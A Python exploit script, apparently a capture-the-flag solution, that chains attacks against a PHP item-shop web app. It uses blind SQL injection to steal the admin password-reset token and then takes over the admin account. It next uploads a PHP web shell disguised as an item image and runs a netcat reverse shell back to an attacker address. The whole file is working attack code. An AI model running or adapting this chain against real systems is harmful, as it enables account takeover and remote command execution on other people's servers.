import requests
import sys
import re
import concurrent.futures
from functools import partial

# http_proxy  = "http://127.0.0.1:8080"
# proxies = {
#     "http": http_proxy
# }

def send_sqli_request(ip, inj_str, j):
    target = "http://%s/item/viewItem.php?id=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
    r = requests.get(target)
    true = r.status_code == 404
    if true:
        return chr(j)
    return ""    

def inject(r, inj, ip):
    extracted = ""
    for i in range(1, r):
        injection_string = "1 AND (ASCII(SUBSTRING((%s),%d,1)))=[CHAR]" % (inj,i)

        #multi: retrieved_value = send_sqli_request(ip,  injection_string)
        with concurrent.futures.ThreadPoolExecutor(max_workers=94) as executor: 
                threads = executor.map(partial(send_sqli_request, ip, injection_string), list(range(32, 126)))
        retrieved_value = ""

        for extracted_char in threads:  # map method puts inject() results in a sequential order
                retrieved_value += extracted_char # into the threads list 
        
        if(retrieved_value):
             extracted += retrieved_value
             sys.stdout.write(extracted_char)
             sys.stdout.write(retrieved_value)
             sys.stdout.flush()
        else:
            print ("\b")
            break
    return extracted

def main():
    if len(sys.argv) != 2:
        print(("(+) usage: %s <target>")  % sys.argv[0])
        print(('(+) eg: %s 192.168.121.103')  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
   
    username = "admin"
    password = "pwnedyeY123#"
    ip_attacker = "192.168.64.1"
    port_attacker = "80"
    # step 1: request forgot password to generate token for admin
    def step1():
        target = "http://%s/login/resetPassword.php" % ip
        payload = {'username': 'admin'}
        response = requests.post(target, data=payload)
        if re.search("Password Reset Link has been sent to you via Email", response.text):
            print("Forgot password request successful!")
        else:
            print("Forgot password request failed!")

    # step 2: fetch token to bypass authentication
    def step2():
        for i in range(0,1):
            queryToken = "SELECT token FROM user WHERE id_level=1 LIMIT %d,1" % i
            return inject(50, queryToken, ip)

    # step 3: use token to bypass authentication using scenario reset password
    def step3(token):
        target = "http://%s/login/doResetPassword.php?token=%s" % (ip, token)
        response = requests.get(target)
        if re.search("<strong>Success! </strong>", response.text):
            targetchange = "http://%s/login/doChangePassword.php" % ip
            payload = {'token': token, 'password': password}
            send = requests.post(targetchange, data=payload)
            if re.search("<strong>Success!</strong>  Password Changed", send.text):
                print("Password reset successful!")
            else:
                 print("Password reset failed!")
        else:
            print("Token Invalid or Expired")
    
    # step 4: login and fetch flag
    session = requests.Session()
    def step4():
        target = "http://%s/login/checkLogin.php" % ip
        payload = {'username': username, 'password': password}
        response = session.post(target, data=payload)
        if re.search("Congrats", response.text):
            print("Login successful!")
            flag = re.search("FLAG1:(.*?)(?:<|$)", response.text)
            print("FLAG1: %s" % str(flag.group(1)))
        else:
            print("Login failed!")

    # step 5: upload phar to get webshell from edit item then access webshell to get reverse shell
    def step5():
        target = "http://%s/item/updateItem.php" % ip
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundary4f36b4c6c9fe21ce192177887c9e6c58", "Origin": "http://192.168.64.2", "Connection": "keep-alive", "Referer": "http://192.168.64.2/item/editItem.php?id=1", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
        payload = "------geckoformboundary4f36b4c6c9fe21ce192177887c9e6c58\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n1\r\n------geckoformboundary4f36b4c6c9fe21ce192177887c9e6c58\r\nContent-Disposition: form-data; name=\"id_user\"\r\n\r\n1\r\n------geckoformboundary4f36b4c6c9fe21ce192177887c9e6c58\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nRaspery Pi 4\r\n------geckoformboundary4f36b4c6c9fe21ce192177887c9e6c58\r\nContent-Disposition: form-data; name=\"image\"; filename=\"shell.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo \"Shell\";system($_GET['cmd']); ?>\n\r\n------geckoformboundary4f36b4c6c9fe21ce192177887c9e6c58\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\nLatest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B\r\n------geckoformboundary4f36b4c6c9fe21ce192177887c9e6c58\r\nContent-Disposition: form-data; name=\"price\"\r\n\r\n92\r\n------geckoformboundary4f36b4c6c9fe21ce192177887c9e6c58--\r\n"
        response = session.post(target,headers=headers,data=payload)
        if re.search("Item data has been edited", response.text):
            print("Successfully uploaded webshell!")
            # access webshell
            print("[+] Performing reverse shell...")
            print("Check your listener for reverse shell")
            shell_response = session.get("http://%s/item/image/shell.phar?cmd=busybox nc %s %s -e bash" % (ip, ip_attacker, port_attacker))
        else:
            print("Failed to upload webshell!")
        

    print("(+) Requesting forgot password to generate token for admin")
    step1()

    token = step2()
    print("(+) Token: %s" % token)

    print("(+) Using token to reset password admin")
    step3(token)

    print("(+) Login as admin and fetch flag")
    step4()

    print("(+) Uploading webshell to get reverse shell")
    step5()


if __name__ == "__main__":
    main()